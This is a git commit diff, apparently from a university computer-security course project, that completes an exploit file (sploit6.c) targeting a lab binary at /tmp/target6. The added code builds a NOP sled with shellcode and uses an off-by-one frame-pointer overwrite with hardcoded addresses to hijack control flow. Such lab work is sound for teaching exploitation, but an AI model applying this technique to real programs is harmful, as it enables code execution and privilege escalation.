e89ed4d837e354a05856125c14f98fd0fa537b4d
Xuehao Ding <xhding@stanford.edu>
2022-04-12 17:25:24 -0700

    proj1 finished

--- sploits/sploit6.c
+++ sploits/sploit6.c
@@ -8,8 +8,20 @@
 #define TARGET "/tmp/target6"
 
 int main(void)
-{
-  char *args[] = { TARGET, "hi there", NULL };
+{ 
+  char sploit[202];
+  memset(sploit, '\x90', sizeof(sploit));
+  sploit[sizeof(sploit)-2] = '\x01';
+  sploit[sizeof(sploit)-1] = '\0';
+  memcpy(sploit, shellcode, sizeof(shellcode)-1);
+
+  int buf_addr = 0xbffffcc0;
+  int new_ebp = 0xbffffd01;
+  int offset = new_ebp - buf_addr;
+  *(int*)(sploit + offset - 4) = 0x804a00c;
+  *(int*)(sploit + offset - 8) = buf_addr;
+  
+  char *args[] = { TARGET, sploit, NULL };
   char *env[] = { NULL };
 
   execve(TARGET, args, env);
